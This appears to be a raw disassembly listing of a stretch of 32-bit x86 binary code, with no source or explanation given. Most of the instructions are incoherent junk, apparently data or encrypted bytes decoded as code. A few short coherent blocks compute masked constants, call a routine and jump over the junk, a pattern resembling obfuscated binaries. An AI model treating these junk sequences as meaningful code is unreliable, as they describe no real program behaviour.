  419b21:	dec    eax
  419b22:	leave  
  419b23:	mov    dh,0x51
  419b25:	in     al,dx
  419b26:	dec    edi
  419b27:	sbb    eax,0x734f4e5d
  419b2c:	sti    
  419b2d:	iret   
  419b2e:	inc    edx
  419b2f:	clc    
  419b30:	clc    
  419b31:	cmp    BYTE PTR [ebx],ah
  419b33:	sbb    DWORD PTR [edx],edi
  419b35:	push   eax
  419b36:	mov    dl,0x40
  419b38:	xor    eax,0xad18d872
  419b3d:	cmp    edx,DWORD PTR [eax+0x46f5ca7]
  419b43:	stos   BYTE PTR es:[edi],al
  419b44:	inc    esp
  419b45:	nop
  419b46:	push   eax
  419b47:	jnp    0x419b42
  419b49:	icebp  
  419b4a:	lahf   
  419b4b:	sbb    BYTE PTR [ebx-0x3f],0x42
  419b4f:	sub    eax,0x67a7fe0a
  419b54:	mov    cl,0x28
  419b56:	cmp    ch,bl
  419b58:	scas   al,BYTE PTR es:[edi]
  419b59:	pop    ebp
  419b5a:	(bad)  
  419b5b:	retf   0x6cd7
  419b5e:	dec    ebx
  419b5f:	inc    edx
  419b60:	pop    edx
  419b61:	push   esp
  419b62:	in     al,0x12
  419b64:	xchg   esp,eax
  419b65:	inc    esp
  419b66:	dec    ebp
  419b67:	sub    BYTE PTR [esi+edi*4],bl
  419b6a:	je     0x419b22
  419b6c:	mov    esp,0x8b898eb4
  419b71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b72:	ds pop ecx
  419b74:	xchg   BYTE PTR [esi],ah
  419b76:	hlt    
  419b77:	jge    0x419b66
  419b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b7a:	cmp    ah,BYTE PTR [edi-0x4b]
  419b7d:	adc    al,0x1
  419b7f:	stos   DWORD PTR es:[edi],eax
  419b80:	xlat   BYTE PTR ds:[ebx]
  419b81:	mov    ebx,0x8a7caa43
  419b86:	or     eax,0xa49e6860
  419b8b:	push   es
  419b8c:	fidivr DWORD PTR [esi-0x41]
  419b8f:	xor    esi,DWORD PTR [ecx+0x73a497b0]
  419b95:	mov    BYTE PTR [eax+0x3f003597],bl
  419b9b:	sahf   
  419b9c:	bound  ebp,QWORD PTR [edi]
  419b9e:	dec    ebx
  419b9f:	xchg   esi,eax
  419ba0:	push   ds
  419ba1:	ins    DWORD PTR es:[edi],dx
  419ba2:	or     ebp,DWORD PTR [ebx+edi*1]
  419ba5:	jae    0x419b29
  419ba7:	cli    
  419ba8:	inc    esp
  419ba9:	les    ebp,FWORD PTR [esi+0x57]
  419bac:	xchg   esi,eax
  419bad:	push   edx
  419bae:	xor    al,0xc9
  419bb0:	jb     0x419beb
  419bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bb3:	inc    edi
  419bb4:	mov    ebp,0xbdf4c4f1
  419bb9:	mov    edi,0xfbe5eac4
  419bbe:	(bad)  
  419bc0:	shr    edx,1
  419bc2:	adc    DWORD PTR [ebx+0x6adb7c9c],0xeb21f20a
  419bcc:	rcr    BYTE PTR [esi+0x40],1
  419bcf:	call   0x70ac:0xbfb0be42
  419bd6:	in     al,dx
  419bd7:	mov    esi,0x9752d66f
  419bdc:	popa   
  419bdd:	lahf   
  419bde:	xbegin 0x908aeff5
  419be4:	pop    ebx
  419be5:	pop    ds
  419be6:	(bad)  
  419be7:	addr16 (bad) 
  419be9:	out    0xc1,al
  419beb:	cwde   
  419bec:	test   eax,0xf53bb19b
  419bf1:	inc    ecx
  419bf2:	mov    eax,0xcff002a0
  419bf7:	pop    ecx
  419bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bf9:	dec    ebp
  419bfa:	xchg   esi,edi
  419bfc:	add    DWORD PTR [edi+0x11],esi
  419bff:	pop    esp
  419c00:	adc    ebx,0xffffff90
  419c03:	dec    edi
  419c04:	lahf   
  419c05:	push   eax
  419c06:	push   ds
  419c07:	aas    
  419c08:	pop    ebx
  419c09:	test   BYTE PTR [eax],0x9e
  419c0c:	mov    dh,0x5e
  419c0e:	mov    dh,BYTE PTR [ebx]
  419c10:	fcmove st,st(1)
  419c12:	iret   
  419c13:	fwait
  419c14:	imul   DWORD PTR [ecx+0x3db3c20a]
  419c1a:	mov    WORD PTR [eax+0x580d4237],?
  419c20:	mov    BYTE PTR [edx+0x77],dl
  419c23:	jne    0x419c43
  419c25:	ret    0xe8c7
  419c28:	cmp    esp,ecx
  419c2a:	mov    DWORD PTR [eax-0x391304e],edx
  419c30:	das    
  419c31:	cli    
  419c32:	daa    
  419c33:	in     al,dx
  419c34:	fadd   QWORD PTR [ebx+0x2303778f]
  419c3a:	nop
  419c3b:	jmp    0x419c3f
  419c3d:	lea    esp,[edx]
  419c3f:	jb     0x419bdd
  419c41:	add    edi,eax
  419c43:	in     al,dx
  419c44:	(bad)  
  419c45:	cli    
  419c46:	in     eax,dx
  419c47:	(bad)  
  419c48:	rol    BYTE PTR gs:[ebp+0x22],1
  419c4c:	popf   
  419c4d:	cmp    eax,0x208e901c
  419c52:	xchg   esp,eax
  419c53:	stc    
  419c54:	call   0x44c8c356
  419c59:	ins    BYTE PTR es:[edi],dx
  419c5a:	arpl   WORD PTR [eax-0x74b3da79],di
  419c60:	pop    eax
  419c61:	adc    eax,0xb65cb35e
  419c66:	mov    bh,0x24
  419c68:	and    DWORD PTR [ebp+0x51],edx
  419c6b:	or     DWORD PTR [ebp-0x761e69],0x46
  419c72:	in     al,0x5
  419c74:	shr    BYTE PTR [edx+0x62],0x7f
  419c78:	push   edi
  419c79:	adc    BYTE PTR [esi-0x436923ba],al
  419c7f:	mov    ebx,0x76745034
  419c84:	mov    dh,0xab
  419c86:	inc    ebp
  419c87:	dec    edi
  419c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c89:	sahf   
  419c8a:	sbb    bh,BYTE PTR [ebx]
  419c8c:	loope  0x419cfe
  419c8e:	jb     0x419cda
  419c90:	mov    esp,0x969796a6
  419c95:	int    0x14
  419c97:	fimul  WORD PTR [edi+0x27f29156]
  419c9d:	sub    BYTE PTR [ecx+0x2d67d161],bl
  419ca3:	xor    eax,esi
  419ca5:	dec    eax
  419ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ca7:	sbb    edi,DWORD PTR [edx-0x30]
  419caa:	sar    DWORD PTR [esi+0x6130e922],0xe3
  419cb1:	dec    ecx
  419cb2:	fmul   QWORD PTR [ecx-0x3d]
  419cb5:	ret    0x9dd4
  419cb8:	std    
  419cb9:	adc    ebx,DWORD PTR [edi-0x2d2163fd]
  419cbf:	xchg   ebx,eax
  419cc0:	xchg   ecx,eax
  419cc1:	xchg   ebx,eax
  419cc2:	out    dx,al
  419cc3:	push   ebx
  419cc4:	add    DWORD PTR [ecx-0x30],0x62
  419cc8:	loopne 0x419ce9
  419cca:	pop    esp
  419ccb:	dec    edi
  419ccc:	lea    edi,[ebx+0x77f3a18]
  419cd2:	ret    
  419cd3:	cmp    ebx,DWORD PTR [ecx-0x36]
  419cd6:	(bad)  
  419cd7:	mov    es:0xe5dbbdd7,eax
  419cdd:	mov    esi,0xd006eeab
  419ce2:	aad    0x8e
  419ce4:	mov    eax,ds:0x63aaafcf
  419ce9:	aaa    
  419cea:	(bad)  
  419ceb:	and    ebp,DWORD PTR [esp+edx*4]
  419cee:	icebp  
  419cef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cf0:	jo     0x419d0d
  419cf2:	jno    0x419cc0
  419cf4:	push   ebx
  419cf5:	pop    ds
  419cf6:	sub    DWORD PTR [eax-0x78224aba],edx
  419cfc:	out    0xb5,al
  419cfe:	jns    0x419d6e
  419d00:	fdiv   st,st(5)
  419d02:	fwait
  419d03:	push   ebp
  419d04:	ins    BYTE PTR es:[edi],dx
  419d05:	jae    0x419cd9
  419d07:	xor    BYTE PTR [edx],bh
  419d09:	dec    edi
  419d0a:	(bad)
  419d0f:	hlt    
  419d10:	cmp    dl,0xda
  419d13:	xchg   DWORD PTR ds:0x942cdd17,esi
  419d19:	sbb    al,0xcb
  419d1b:	icebp  
  419d1c:	loop   0x419d49
  419d1e:	loope  0x419d68
  419d20:	fnstsw WORD PTR [ebx]
  419d22:	pushf  
  419d23:	add    BYTE PTR fs:[edx-0x14ec02df],dh
  419d2a:	(bad)  
  419d2b:	(bad)  
  419d2c:	mov    esp,DWORD PTR [edi+0x7b]
  419d2f:	(bad)
  419d34:	(bad)  
  419d35:	inc    esp
  419d36:	pusha  
  419d37:	or     BYTE PTR [ecx],dh
  419d39:	add    ebp,DWORD PTR [ebp+0x3da66171]
  419d3f:	test   BYTE PTR [esi+0x6ff87b8c],ah
  419d45:	jnp    0x419dc3
  419d47:	push   ebx
  419d48:	popf   
  419d49:	bound  esi,QWORD PTR [ebx-0x3d]
  419d4c:	pop    ecx
  419d4d:	cmp    DWORD PTR [ebp+0x7865d1ec],ebx
  419d53:	mov    bl,BYTE PTR [ecx]
  419d55:	(bad)  
  419d56:	dec    esp
  419d57:	leave  
  419d58:	adc    eax,0xbd4afcc
  419d5d:	inc    edi
  419d5e:	push   ebx
  419d5f:	mov    ds:0x36d61e75,al
  419d64:	shl    DWORD PTR [eax+0xb],cl
  419d67:	lock xchg ecx,eax
  419d69:	mov    WORD PTR [eax-0x50d65de],?
  419d6f:	sbb    al,0xed
  419d71:	cmp    eax,0x98a1a13d
  419d76:	dec    edx
  419d77:	add    BYTE PTR [edi-0x1f58090a],dl
  419d7d:	adc    esi,DWORD PTR [ebx]
  419d7f:	inc    ecx
  419d80:	bound  eax,QWORD PTR [ebx-0x13]
  419d83:	dec    ebp
  419d84:	arpl   WORD PTR [esi-0x51],si
  419d87:	fcmovne st,st(3)
  419d89:	cmp    BYTE PTR [esi+ebx*4],bl
  419d8c:	pushf  
  419d8d:	and    dl,ch
  419d8f:	loope  0x419d92
  419d91:	mov    eax,0x65159d1e
  419d96:	or     BYTE PTR [eax],cl
  419d98:	xchg   edi,eax
  419d99:	adc    eax,edx
  419d9b:	jo     0x419de3
  419d9d:	mov    bh,0x27
  419d9f:	loope  0x419d7b
  419da1:	call   0x34472cbd
  419da6:	aad    0x11
  419da8:	in     al,dx
  419da9:	mov    al,ds:0x486ce023
  419dae:	or     al,0x5
  419db0:	test   BYTE PTR [edx-0x5e],bh
  419db3:	mov    ah,0x6c
  419db5:	dec    ebp
  419db6:	lds    eax,FWORD PTR [edi]
  419db8:	shl    DWORD PTR [ebp-0x41],1
  419dbb:	enter  0xabb0,0x1
  419dbf:	cmp    ebx,ecx
  419dc1:	mul    BYTE PTR [eax]
  419dc3:	and    bl,BYTE PTR [esp+ebp*8+0x61]
  419dc7:	inc    ecx
  419dc8:	outs   dx,DWORD PTR ds:[esi]
  419dc9:	mov    BYTE PTR [eax-0x23cad639],dh
  419dcf:	xor    al,0xd7
  419dd1:	jle    0x419e04
  419dd3:	(bad)  
  419dd4:	loopne 0x419d5f
  419dd6:	cld    
  419dd7:	int3   
  419dd8:	fmul   QWORD PTR [edx-0x1a982a73]
  419dde:	pop    edx
  419ddf:	(bad)  
  419de1:	mov    ds:0xed595513,al
  419de6:	dec    ebx
  419de7:	mul    BYTE PTR [edi+0x1adbbccd]
  419ded:	cmp    al,0xf
  419def:	fisub  WORD PTR [edi+0x69a61054]
  419df5:	out    0xd0,eax
  419df7:	sti    
  419df8:	and    al,0xe8
  419dfa:	pop    eax
  419dfb:	xchg   esp,eax
  419dfc:	jp     0x419e5d
  419dfe:	out    0xc2,al
  419e00:	cmp    al,0x3a
  419e02:	mov    eax,0x263c6eed
  419e07:	jne    0x419e47
  419e09:	push   esi
  419e0a:	shr    DWORD PTR [ebx+0x5a],cl
  419e0d:	cmp    al,0xec
  419e0f:	dec    edx
  419e10:	cmp    eax,0x9c2b44d
  419e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e16:	push   ecx
  419e17:	xchg   edx,eax
  419e18:	jl     0x419e00
  419e1a:	jl     0x419dcc
  419e1c:	add    ch,BYTE PTR [eax+0x6f428c64]
  419e22:	dec    edi
  419e23:	test   eax,0x395b712b
  419e28:	iret   
  419e29:	psubusb mm7,QWORD PTR [edx+edi*8]
  419e2d:	push   eax
  419e2e:	stc    
  419e2f:	push   edi
  419e30:	jmp    0x419e5e
  419e32:	sbb    al,BYTE PTR ds:0x4c8b23f8
  419e38:	and    al,0x14
  419e3a:	mov    edx,DWORD PTR [esp+0x30]
  419e3e:	mov    ebx,DWORD PTR [esp+0x34]
  419e42:	add    eax,0xffffd1a5
  419e47:	adc    ecx,0xffffedf0
  419e4d:	xor    eax,edx
  419e4f:	xor    ecx,ebx
  419e51:	jmp    0x41a220
  419e56:	pop    eax
  419e58:	es push esp
  419e5a:	sub    bl,BYTE PTR es:[ebx-0x46]
  419e5e:	pusha  
  419e5f:	in     eax,0xd3
  419e61:	mov    esp,0xbc995a67
  419e66:	xchg   BYTE PTR [ebp+0x12bc1816],dh
  419e6c:	sbb    BYTE PTR [eax],bl
  419e6e:	mov    BYTE PTR [edx+0xe],dl
  419e71:	(bad)  
  419e73:	cld    
  419e74:	jne    0x419e74
  419e76:	cmp    eax,0x12ded3c
  419e7b:	dec    eax
  419e7c:	scas   eax,DWORD PTR es:[edi]
  419e7d:	push   es
  419e7e:	pop    esp
  419e7f:	mov    esi,0x9323c2a4
  419e84:	fdiv   QWORD PTR [ebp+0x5a]
  419e87:	xchg   BYTE PTR [eax+0x7c],cl
  419e8a:	jle    0x419ef0
  419e8c:	cmp    al,BYTE PTR [ecx+0x7f67d409]
  419e92:	test   al,bh
  419e94:	xor    eax,0x53d8adb
  419e99:	pop    ds
  419e9a:	ds cdq 
  419e9c:	(bad)  
  419e9d:	mov    ds:0xa63971cd,al
  419ea2:	cwde   
  419ea3:	aas    
  419ea4:	or     eax,0x166b2792
  419ea9:	in     al,0x3f
  419eab:	cli    
  419eac:	jmp    0xd22c9dec
  419eb1:	pusha  
  419eb2:	sbb    DWORD PTR [eax+esi*4+0x31],eax
  419eb6:	mov    WORD PTR [ebp-0x1d1c6203],?
  419ebc:	lock mov BYTE PTR [esi],bh
  419ebf:	sbb    eax,0x7ed988d6
  419ec4:	ins    DWORD PTR es:[edi],dx
  419ec5:	mov    eax,ds:0xa92b1c33
  419eca:	xchg   esp,eax
  419ecb:	and    BYTE PTR [eax+0x73213751],cl
  419ed1:	int    0x11
  419ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ed4:	or     ch,BYTE PTR [ecx-0x2a]
  419ed7:	aam    0x39
  419ed9:	pop    edx
  419eda:	xor    DWORD PTR [ebx-0x6c],edi
  419edd:	sbb    al,0x66
  419edf:	cmp    DWORD PTR [edi],ecx
  419ee1:	pushf  
  419ee2:	stos   BYTE PTR es:[edi],al
  419ee3:	or     al,0x52
  419ee5:	xor    eax,0xf1ee4a5a
  419eea:	aad    0x3e
  419eec:	leave  
  419eed:	sbb    DWORD PTR [ebp+0x76a1e1bb],esp
  419ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ef4:	ss push esp
  419ef6:	dec    ebp
  419ef7:	daa    
  419ef8:	pop    ss
  419ef9:	cmp    BYTE PTR [ecx-0x5b],ch
  419efc:	int3   
  419efd:	cmp    al,0xa2
  419eff:	mov    ecx,0x19baca41
  419f04:	hlt    
  419f05:	shl    BYTE PTR [esi],1
  419f07:	push   ecx
  419f08:	shl    ecx,1
  419f0a:	fs pop ds
  419f0c:	add    eax,0xb7a4071
  419f11:	sub    al,0xb6
  419f13:	addr16 call 0x29c6:0xc509a3b7
  419f1b:	ror    BYTE PTR [ecx+0x3e],cl
  419f1e:	sub    esi,ebx
  419f20:	or     edi,DWORD PTR [ecx+0x28]
  419f23:	ins    BYTE PTR es:[edi],dx
  419f24:	outs   dx,BYTE PTR ds:[esi]
  419f25:	popa   
  419f26:	ds ins BYTE PTR es:[edi],dx
  419f28:	add    eax,0xcdd6dc72
  419f2d:	enter  0xfb47,0x3f
  419f31:	mov    cl,0x54
  419f33:	(bad)  
  419f34:	aad    0x12
  419f36:	mov    ds:0x51983fe2,al
  419f3b:	mov    ebx,0xaa884162
  419f40:	xchg   esi,eax
  419f41:	pop    esi
  419f42:	xor    esi,DWORD PTR [edi+0x62]
  419f45:	stc    
  419f46:	xor    ah,ch
  419f48:	add    al,0x8f
  419f4a:	out    dx,al
  419f4b:	nop
  419f4c:	pop    es
  419f4d:	xlat   BYTE PTR ds:[ebx]
  419f4e:	jno    0x419f13
  419f50:	mov    eax,0xfc8c0c44
  419f55:	fst    QWORD PTR [eax]
  419f57:	pop    edx
  419f58:	push   eax
  419f59:	push   esp
  419f5a:	and    ebx,DWORD PTR [ebx]
  419f5c:	jge    0x419eff
  419f5e:	mov    cl,0xe0
  419f60:	jbe    0x419fa8
  419f62:	shl    BYTE PTR [esi-0x14],cl
  419f65:	mov    dl,0x50
  419f67:	ret    0xfe9b
  419f6a:	cmp    al,0xc9
  419f6c:	cmp    al,ch
  419f6e:	jns    0x419f65
  419f70:	xor    eax,0x15a0a287
  419f75:	jp     0x419f03
  419f77:	in     eax,dx
  419f78:	cmc    
  419f79:	adc    al,0x3f
  419f7b:	or     al,0x64
  419f7d:	pop    ss
  419f7e:	mov    edi,ebp
  419f80:	jb     0x419ff0
  419f82:	and    eax,0xdbb2646
  419f87:	std    
  419f88:	cld    
  419f89:	fwait
  419f8a:	call   0x3d324ddc
  419f8f:	ret    
  419f90:	pop    edx
  419f91:	in     al,dx
  419f92:	popf   
  419f93:	(bad)  
  419f94:	jle    0x419f5b
  419f96:	pop    ebp
  419f97:	jmp    0x5041:0x76c744c7
  419f9e:	pop    ss
  419f9f:	pop    es
  419fa0:	push   es
  419fa1:	pop    edi
  419fa2:	add    eax,0xaf0b0894
  419fa7:	pusha  
  419fa8:	cld    
  419fa9:	fs xchg ebp,eax
  419fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fac:	xchg   ebx,eax
  419fad:	cmp    bh,al
  419faf:	sbb    cl,BYTE PTR [ecx+0x50a05bd1]
  419fb5:	mov    cl,0xd0
  419fb7:	adc    bl,BYTE PTR [ecx+0x51399752]
  419fbd:	sahf   
  419fbe:	rol    edi,cl
  419fc0:	hlt    
  419fc1:	sbb    DWORD PTR [edx+ecx*2+0x46],0xe
  419fc6:	outs   dx,BYTE PTR ds:[esi]
  419fc7:	push   esp
  419fc8:	lods   al,BYTE PTR ds:[esi]
  419fc9:	and    ebp,DWORD PTR [ebp-0x7b]
  419fcc:	int    0x5d
  419fce:	xor    ebx,DWORD PTR [edx+0x61]
  419fd1:	push   eax
  419fd2:	das    
  419fd3:	popa   
  419fd4:	mov    ds:0x7714352f,eax
  419fd9:	jle    0x41a00d
  419fdb:	add    DWORD PTR [eax],eax
  419fdd:	test   eax,0x209ef94a
  419fe2:	dec    eax
  419fe3:	ret    0x70c7
  419fe6:	mov    dl,0xee
  419fe8:	dec    edi
  419fe9:	and    BYTE PTR [edx+eiz*1+0x565bf355],0xb3
  419ff1:	add    eax,0x8f78e81a
  419ff6:	in     al,0x4e
  419ff8:	add    eax,0x82a0e6a8
  419ffd:	inc    edi
  419ffe:	pop    eax
  419fff:	or     esi,DWORD PTR ds:[eax+edi*8]
  41a003:	dec    eax
  41a004:	(bad)  
  41a006:	push   esp
  41a007:	and    eax,0x250d84a7
  41a00c:	sub    ah,dl
  41a00e:	pusha  
  41a00f:	nop
  41a010:	ja     0x41a039
  41a012:	and    bl,bh
  41a014:	mov    ebx,ds
  41a016:	add    dh,BYTE PTR [esi]
  41a018:	adc    bh,dl
  41a01a:	and    al,cl
  41a01c:	retf   
  41a01d:	retf   
  41a01e:	enter  0xc532,0x8b
  41a022:	leave  
  41a023:	xor    bh,BYTE PTR [esi-0x3bcaaaa4]
  41a029:	dec    ebx
  41a02a:	int3   
  41a02b:	cs xchg esp,eax
  41a02d:	sbb    DWORD PTR [esi-0x34792b06],edx
  41a033:	xchg   ebx,eax
  41a034:	push   es
  41a035:	mov    ah,0x26
  41a037:	push   esi
  41a038:	in     al,dx
  41a039:	call   0x253b:0x4f8a4f40
  41a040:	jo     0x41a0b8
  41a042:	mov    ah,BYTE PTR [ebp-0x2eb373cd]
  41a048:	cmp    bh,BYTE PTR ds:0xfdc573f0
  41a04e:	xor    dl,BYTE PTR [esi]
  41a050:	jecxz  0x41a07e
  41a052:	and    BYTE PTR [esi-0x71cd65ac],al
  41a058:	push   edx
  41a059:	in     eax,0x4a
  41a05b:	adc    DWORD PTR [ecx-0x5dfde371],0xb504c289
  41a065:	mul    BYTE PTR [ebp+edi*1+0x16]
  41a069:	clc    
  41a06a:	ror    BYTE PTR [edx+eiz*4-0x5a484e9a],0x36
  41a072:	cwde   
  41a073:	xchg   ebx,eax
  41a074:	fdivr  QWORD PTR [eax+0x23]
  41a077:	iret   
  41a078:	scas   al,BYTE PTR es:[edi]
  41a079:	mov    ecx,0xb77f5511
  41a07e:	out    dx,eax
  41a07f:	adc    DWORD PTR [ecx+0x4e],0x43
  41a083:	icebp  
  41a084:	lea    ebx,[esi-0x64ebf627]
  41a08a:	sub    ch,BYTE PTR [eax]
  41a08c:	xor    BYTE PTR [ebp+0x28],ah
  41a08f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a090:	or     eax,0x7e11c132
  41a095:	add    dl,BYTE PTR [esi+0x20a6bbed]
  41a09b:	gs mov ebp,0x606b917a
  41a0a1:	mov    al,0xdc
  41a0a3:	push   cs
  41a0a4:	aaa    
  41a0a5:	not    ebp
  41a0a7:	(bad)  
  41a0a8:	dec    ebp
  41a0a9:	push   esi
  41a0aa:	jmp    0x96919df2
  41a0af:	fxch   st(4)
  41a0b1:	sbb    bl,BYTE PTR [edi]
  41a0b3:	es xchg ebp,eax
  41a0b5:	add    DWORD PTR [eax-0x3e],0x467ddbfa
  41a0bc:	cwde   
  41a0bd:	popa   
  41a0be:	lds    ebp,FWORD PTR [edx]
  41a0c0:	dec    ebp
  41a0c1:	imul   esi,DWORD PTR [ecx-0x3d],0x6262d273
  41a0c8:	loope  0x41a0af
  41a0ca:	xchg   edx,eax
  41a0cb:	nop
  41a0cc:	mov    dh,0x3
  41a0ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0cf:	or     BYTE PTR [ecx+0x490d9729],cl
  41a0d5:	fwait
  41a0d6:	out    dx,eax
  41a0d7:	aad    0x55
  41a0d9:	aad    0x2a
  41a0db:	out    0xfa,al
  41a0dd:	stc    
  41a0de:	jp     0x41a08f
  41a0e0:	mov    ebp,0xdb215dbc
  41a0e5:	ficomp DWORD PTR [edi+0x30]
  41a0e8:	sbb    al,0x39
  41a0ea:	jne    0x41a089
  41a0ec:	aam    0xd
  41a0ee:	cmp    bh,BYTE PTR [eax+0x1a]
  41a0f1:	sub    dl,BYTE PTR [esp+ecx*4]
  41a0f4:	stos   BYTE PTR es:[edi],al
  41a0f5:	sub    edi,DWORD PTR [eax-0xd]
  41a0f8:	rcl    BYTE PTR [esi-0x78],0x88
  41a0fc:	jne    0x41a07e
  41a0fe:	dec    ebp
  41a0ff:	mul    BYTE PTR [ebx+0x51]
  41a102:	mov    dh,BYTE PTR [eax]
  41a104:	jae    0x41a125
  41a106:	mov    dl,0x90
  41a108:	inc    edx
  41a109:	mov    bh,0xfb
  41a10b:	sbb    eax,0x2cde14c5
  41a110:	ror    DWORD PTR [edx+0x38],cl
  41a113:	cmp    BYTE PTR [ebp-0xf337e10],bh
  41a119:	and    eax,0x39aa9306
  41a11e:	mul    DWORD PTR [eax+0x56]
  41a121:	push   cs
  41a122:	es js  0x41a0e1
  41a125:	xchg   esp,eax
  41a126:	xchg   esi,eax
  41a127:	addr16 or al,0x94
  41a12a:	clc    
  41a12b:	fmul   st(6),st
  41a12d:	sbb    eax,0x265114f7
  41a132:	pop    es
  41a133:	rcr    ah,cl
  41a135:	xchg   edi,eax
  41a136:	cmp    ebp,DWORD PTR [ecx]
  41a138:	daa    
  41a139:	repnz or ebx,DWORD PTR [edi-0x54]
  41a13d:	in     eax,0x92
  41a13f:	mov    ecx,0x44760f18
  41a144:	add    ecx,DWORD PTR es:[esi-0x64]
  41a148:	pop    edx
  41a149:	fiadd  WORD PTR [eax+0x40404c48]
  41a14f:	cmp    al,0xec
  41a151:	inc    eax
  41a152:	jg     0x41a1bd
  41a154:	ret    0x6ec1
  41a157:	iret   
  41a158:	cdq    
  41a159:	sbb    dh,BYTE PTR [ecx+edi*4+0x416e26a]
  41a160:	jg     0x41a157
  41a162:	aam    0x86
  41a164:	pop    ebx
  41a165:	mov    fs,eax
  41a167:	repnz ins DWORD PTR es:[edi],dx
  41a169:	fdivr  DWORD PTR [esi]
  41a16b:	mov    dh,BYTE PTR [edx-0x6ff67b18]
  41a171:	and    ebx,DWORD PTR [esi]
  41a173:	ret    0x174d
  41a176:	mov    WORD PTR [ebx-0x756f238a],ds
  41a17c:	fstp   DWORD PTR [edi+0x35026f47]
  41a182:	scas   al,BYTE PTR es:[edi]
  41a183:	or     esp,DWORD PTR [ecx]
  41a185:	js     0x41a123
  41a187:	push   ebp
  41a188:	pop    edx
  41a189:	shl    BYTE PTR [esi],0x38
  41a18c:	jl     0x41a14d
  41a18e:	and    bh,BYTE PTR [edx-0x24ef53c0]
  41a194:	push   ebp
  41a195:	dec    ecx
  41a196:	outs   dx,BYTE PTR ds:[esi]
  41a197:	rcl    dl,0x83
  41a19a:	fwait
  41a19b:	stos   BYTE PTR es:[edi],al
  41a19c:	sub    ecx,DWORD PTR [edi]
  41a19e:	pop    ebp
  41a19f:	aas    
  41a1a0:	imul   eax,DWORD PTR [ebp+0x19],0x15931b35
  41a1a7:	dec    esi
  41a1a8:	jl     0x41a131
  41a1aa:	push   ecx
  41a1ab:	dec    esp
  41a1ac:	pop    es
  41a1ad:	push   edi
  41a1ae:	mov    al,0x92
  41a1b0:	test   BYTE PTR [edi+eiz*8],ch
  41a1b3:	sub    ch,bl
  41a1b5:	jmp    esi
  41a1b7:	pop    eax
  41a1b8:	mov    eax,0x5939e613
  41a1bd:	pop    esi
  41a1be:	and    al,0xb0
  41a1c0:	add    eax,0x8531c6ce
  41a1c5:	fbstp  TBYTE PTR [edx]
  41a1c7:	push   eax
  41a1c8:	mov    ch,BYTE PTR [eax]
  41a1ca:	clc    
  41a1cb:	data16 mov ah,0xa3
  41a1ce:	std    
  41a1cf:	jg     0x41a24b
  41a1d1:	retf   
  41a1d2:	test   al,0x31
  41a1d4:	inc    esp
  41a1d5:	fs add al,0x7b
  41a1d8:	pop    eax
  41a1d9:	pop    edx
  41a1da:	dec    esi
  41a1db:	retf   0x2a07
  41a1de:	jecxz  0x41a1f3
  41a1e0:	mov    ch,0x9
  41a1e2:	push   esp
  41a1e3:	test   al,0xb1
  41a1e5:	les    edx,FWORD PTR [edx-0x12bfdb55]
  41a1eb:	sahf   
  41a1ec:	(bad)  
  41a1ed:	sbb    al,0x1
  41a1ef:	inc    edx
  41a1f0:	daa    
  41a1f1:	mov    edi,0xc0e59368
  41a1f6:	sbb    BYTE PTR [ebx-0x60cf441a],bl
  41a1fc:	mov    edi,0xa850c8be
  41a201:	dec    edi
  41a202:	cs and al,0xd4
  41a205:	jl     0x41a1b8
  41a207:	nop
  41a208:	icebp  
  41a209:	call   0x9802:0x538e75f0
  41a210:	xchg   ecx,eax
  41a211:	rol    eax,1
  41a213:	jnp    0x41a28b
  41a215:	aas    
  41a216:	xor    DWORD PTR [ebx],eax
  41a218:	loope  0x41a23a
  41a21a:	les    eax,FWORD PTR [edx-0x2bef9d6f]
  41a220:	and    eax,0x325d
  41a225:	mov    DWORD PTR [esp+0x50],eax
  41a229:	and    ecx,0x3544
  41a22f:	mov    DWORD PTR [esp+0x54],ecx
  41a233:	mov    DWORD PTR [esp+0x48],0x1704
  41a23b:	mov    DWORD PTR [esp+0x4c],0x4a75
  41a243:	mov    DWORD PTR [esp+0x30],0x985
  41a24b:	mov    DWORD PTR [esp+0x34],0x341
  41a253:	mov    DWORD PTR [esp+0x10],0x5aa9
  41a25b:	mov    DWORD PTR [esp+0x14],0x221a
  41a263:	mov    eax,DWORD PTR [esp+0x10]
  41a267:	mov    ecx,DWORD PTR [esp+0x14]
  41a26b:	mov    edx,DWORD PTR [esp+0x30]
  41a26f:	mov    ebx,DWORD PTR [esp+0x34]
  41a273:	push   ebx
  41a274:	push   edx
  41a275:	or     ecx,0xc32
  41a27b:	or     eax,0x502a
  41a280:	push   ecx
  41a281:	push   eax
  41a282:	call   0x416c20
  41a287:	mov    ecx,DWORD PTR [esp+0x48]
  41a28b:	mov    ebx,DWORD PTR [esp+0x4c]
  41a28f:	jmp    0x41a65e
  41a294:	call   0x1a7c:0x2b8dec68
  41a29b:	es popf 
  41a29d:	retf   0x7e10
  41a2a0:	js     0x41a266
  41a2a2:	or     bh,BYTE PTR [esi+0x2b]
  41a2a5:	lods   eax,DWORD PTR ds:[esi]
  41a2a6:	push   ss
  41a2a7:	sbb    BYTE PTR [edx+edx*1-0x50c1e7e8],bh
  41a2ae:	jmp    0x9e9a02ac
  41a2b3:	mov    edx,0xeb07bf83
  41a2b8:	pop    esi
  41a2b9:	(bad)  
  41a2ba:	xchg   esi,eax
  41a2bb:	or     bh,bl
  41a2bd:	cmp    DWORD PTR [esi],0x34
  41a2c0:	pop    edi
  41a2c1:	fwait
  41a2c2:	test   eax,0xde584c3a
  41a2c7:	repnz sbb eax,DWORD PTR ds:0xd5e72fc7
  41a2ce:	icebp  
  41a2cf:	adc    DWORD PTR [esi+0x17],ebx
  41a2d2:	call   0x2834:0x6c49eb7b
  41a2d9:	aas    
  41a2da:	mov    bl,0x23
  41a2dc:	mov    fs,WORD PTR [ecx+0x5b140572]
